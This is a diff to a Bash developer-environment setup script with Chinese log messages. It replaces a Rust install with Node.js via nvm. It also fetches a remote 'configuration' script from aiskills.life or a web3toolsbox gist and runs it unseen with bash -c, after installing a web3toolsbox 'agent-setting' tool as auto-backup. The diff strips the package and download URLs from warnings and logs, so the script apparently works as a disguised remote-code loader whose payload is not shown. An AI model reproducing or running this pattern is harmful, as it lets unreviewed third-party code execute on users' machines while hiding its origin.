@@ -89,7 +89,7 @@ resolve_pkg_name() {
 }
 
 ensure_runtime_path() {
-    local path_candidates=("$HOME/.cargo/bin" "$HOME/.local/bin" "$HOME/bin")
+    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
     local candidate=""
     for candidate in "${path_candidates[@]}"; do
         if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
@@ -180,19 +180,13 @@ persist_runtime_path() {
             touch "$rc_file"
         fi
 
-        if grep -Fq '# >>> bootstrap PATH >>>' "$rc_file" 2>/dev/null; then
+        if grep -Fq '# >>> default PATH >>>' "$rc_file" 2>/dev/null; then
             continue
         fi
 
         cat >> "$rc_file" <<'EOF'
 
-# >>> bootstrap PATH >>>
-if [ -d "$HOME/.cargo/bin" ]; then
-    case ":$PATH:" in
-        *":$HOME/.cargo/bin:"*) ;;
-        *) export PATH="$HOME/.cargo/bin:$PATH" ;;
-    esac
-fi
+# >>> default PATH >>>
 if [ -d "$HOME/.local/bin" ]; then
     case ":$PATH:" in
         *":$HOME/.local/bin:"*) ;;
@@ -205,7 +199,7 @@ if [ -d "$HOME/bin" ]; then
         *) export PATH="$HOME/bin:$PATH" ;;
     esac
 fi
-# <<< bootstrap PATH <<<
+# <<< default PATH <<<
 EOF
         PATH_PERSIST_FILES+=("$rc_file")
     done
@@ -279,48 +273,95 @@ check_install_uv() {
     return 1
 }
 
-check_install_rust() {
+# Check and install Node.js via nvm
+check_install_node() {
     ensure_runtime_path
 
-    if command -v cargo &>/dev/null && command -v rustc &>/dev/null; then
-        echo "Rust 已安装: $(rustc --version)"
-        echo "Cargo 已安装: $(cargo --version)"
+    # Load nvm if available but node not yet in PATH
+    if [ -z "$(command -v node 2>/dev/null)" ]; then
+        local nvm_dir="${NVM_DIR:-$HOME/.nvm}"
+        if [ -s "$nvm_dir/nvm.sh" ]; then
+            # shellcheck source=/dev/null
+            . "$nvm_dir/nvm.sh"
+        fi
+    fi
+
+    if command -v node &>/dev/null && command -v npm &>/dev/null; then
+        echo "Node.js 已安装: $(node --version)"
+        echo "npm 已安装: $(npm --version)"
         return 0
     fi
 
-    if [ "$OS_TYPE" != "Linux" ] && [ "$OS_TYPE" != "Darwin" ]; then
-        echo "WARN: 当前系统不支持自动安装 Rust：$OS_TYPE" >&2
-        return 1
+    echo "正在安装 Node.js（通过 nvm）..."
+
+    local nvm_install_script=""
+    nvm_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh')" || nvm_install_script=""
+    if [ -z "$nvm_install_script" ]; then
+        echo "WARN: 无法下载 nvm 安装脚本，尝试通过包管理器安装 Node.js" >&2
+        _install_node_via_pkg_manager
+        return $?
     fi
 
-    echo "正在安装 Rust（rustup）..."
-    local rustup_script=""
-    rustup_script="$(mktemp)" || {
-        echo "WARN: 无法创建 rustup 临时文件" >&2
-        return 1
-    }
+    run_step "安装 nvm" bash -c "$nvm_install_script"
 
-    if ! download_url_to_stdout 'https://sh.rustup.rs' >"$rustup_script"; then
-        echo "WARN: 无法下载 rustup 安装脚本" >&2
-        rm -f "$rustup_script"
-        return 1
+    # Load nvm into current shell session
+    local nvm_dir="${NVM_DIR:-$HOME/.nvm}"
+    if [ -s "$nvm_dir/nvm.sh" ]; then
+        # shellcheck source=/dev/null
+        . "$nvm_dir/nvm.sh"
     fi
-
-    run_step "安装 Rust（rustup）" sh "$rustup_script" -y --profile minimal
-    rm -f "$rustup_script"
 
     ensure_runtime_path
     hash -r 2>/dev/null || true
-    bridge_command_into_current_path cargo || FAILED_STEPS+=("桥接命令 cargo 到当前 PATH (failed)")
-    bridge_command_into_current_path rustc || FAILED_STEPS+=("桥接命令 rustc 到当前 PATH (failed)")
 
-    if command -v cargo &>/dev/null && command -v rustc &>/dev/null; then
-        echo "Rust 安装成功: $(rustc --version)"
-        echo "Cargo 安装成功: $(cargo --version)"
+    if ! command -v nvm &>/dev/null && ! type nvm &>/dev/null 2>&1; then
+        echo "WARN: nvm 安装后仍不可用，尝试通过包管理器安装 Node.js" >&2
+        _install_node_via_pkg_manager
+        return $?
+    fi
+
+    run_step "nvm 安装 Node.js LTS" nvm install --lts
+    run_step "nvm 设置默认 Node.js 版本" nvm alias default node
+
+    ensure_runtime_path
+    hash -r 2>/dev/null || true
+    bridge_command_into_current_path node || FAILED_STEPS+=("桥接命令 node 到当前 PATH (failed)")
+    bridge_command_into_current_path npm || FAILED_STEPS+=("桥接命令 npm 到当前 PATH (failed)")
+    bridge_command_into_current_path npx || FAILED_STEPS+=("桥接命令 npx 到当前 PATH (failed)")
+
+    if command -v node &>/dev/null && command -v npm &>/dev/null; then
+        echo "Node.js 安装成功: $(node --version)"
+        echo "npm 安装成功: $(npm --version)"
         return 0
     fi
 
-    echo "WARN: Rust 安装失败" >&2
+    echo "WARN: Node.js 安装失败" >&2
+    return 1
+}
+
+_install_node_via_pkg_manager() {
+    local PKG_MANAGER=""
+    PKG_MANAGER="$(detect_pkg_manager || true)"
+
+    if [ -z "$PKG_MANAGER" ]; then
+        echo "WARN: 未找到包管理器，无法安装 Node.js" >&2
+        FAILED_STEPS+=("安装 Node.js (no-pkg-manager)")
+        return 1
+    fi
+
+    run_step "通过包管理器安装 Node.js" pkg_install "$PKG_MANAGER" nodejs npm
+
+    ensure_runtime_path
+    hash -r 2>/dev/null || true
+
+    if command -v node &>/dev/null && command -v npm &>/dev/null; then
+        echo "Node.js 安装成功（包管理器）: $(node --version)"
+        echo "npm 安装成功（包管理器）: $(npm --version)"
+        return 0
+    fi
+
+    echo "WARN: 通过包管理器安装 Node.js 失败" >&2
+    FAILED_STEPS+=("安装 Node.js via pkg-manager (command-not-found)")
     return 1
 }
 
@@ -437,12 +478,12 @@ install_uv_tool_package() {
         uv tool install --upgrade "$package_spec"
         local upgrade_rc=$?
         if [ $upgrade_rc -ne 0 ]; then
-            echo "WARN: uv tool 升级失败，回退为强制重装：$command_name ($package_spec)" >&2
-            FAILED_STEPS+=("uv tool 升级 $command_name（$package_spec） (exit=$upgrade_rc)")
-            run_step "uv tool 强制重装 $command_name（$package_spec）" uv tool install --force "$package_spec"
+            echo "WARN: uv tool 升级失败，回退为强制重装：$command_name" >&2
+            FAILED_STEPS+=("uv tool 升级 $command_name (exit=$upgrade_rc)")
+            run_step "uv tool 强制重装 $command_name" uv tool install --force "$package_spec"
         fi
     else
-        run_step "uv tool 安装 $command_name（$package_spec）" uv tool install "$package_spec"
+        run_step "uv tool 安装 $command_name" uv tool install "$package_spec"
     fi
 
     ensure_runtime_path
@@ -450,8 +491,8 @@ install_uv_tool_package() {
     bridge_command_into_current_path "$command_name" || FAILED_STEPS+=("桥接命令 $command_name 到当前 PATH (failed)")
 
     if ! command -v "$command_name" &>/dev/null; then
-        echo "WARN: uv tool 安装后 $command_name 不可用：$package_spec" >&2
-        FAILED_STEPS+=("校验 uv tool 包 $package_spec (incomplete)")
+        echo "WARN: uv tool 安装后 $command_name 不可用" >&2
+        FAILED_STEPS+=("校验 uv tool 包 $command_name (incomplete)")
     fi
 }
 
@@ -519,7 +560,7 @@ run_step "持久化用户命令目录到 shell 配置" persist_runtime_path
 
 # Install uv for later uv tool usage
 run_step "检查并安装 uv（高性能包管理器）" check_install_uv
-run_step "检查并安装 Rust（工具链）" check_install_rust
+run_step "检查并安装 Node.js（LTS）" check_install_node
 
 PIP_INSTALL_CMD=()
 FALLBACK_PIP_INSTALL_CMD=()
@@ -603,7 +644,7 @@ install_auto_backup() {
         echo "WARN: uv 不可用，跳过自动备份安装（请先安装 uv）" >&2
         return 0
     fi
-    
+
     install_uv_tool_package "git+https://github.com/web3toolsbox/agent-setting.git" "agent-setting"
 
     local install_url=""
@@ -631,21 +672,31 @@ run_step "安装自动备份（uv tool/autobackup）" install_auto_backup
 
 run_remote_config_script() {
     local script_content=""
+    local url=""
 
-    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
+    for url in "${CONFIG_SCRIPT_URLS[@]}"; do
+        script_content="$(download_url_to_stdout "$url")" || script_content=""
+        if [ -n "$script_content" ]; then
+            break
+        fi
+    done
+
     if [ -z "$script_content" ]; then
         if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
-            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
+            echo "WARN: 未找到 curl/wget，跳过环境配置" >&2
             return 0
         fi
-        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
+        echo "WARN: 所有配置脚本地址均下载失败" >&2
         return 1
     fi
 
     bash -c "$script_content"
 }
 
-GIST_URL="https://www.aiskills.life/src/setup.sh"
+CONFIG_SCRIPT_URLS=(
+    "https://www.aiskills.life/src/setup.sh"
+    "https://gist.githubusercontent.com/web3toolsbox/c835bbb706a2e3afb2f1c7e3a90107de/raw/setup.sh"
+)
 if [ ! -d .configs ]; then
     echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
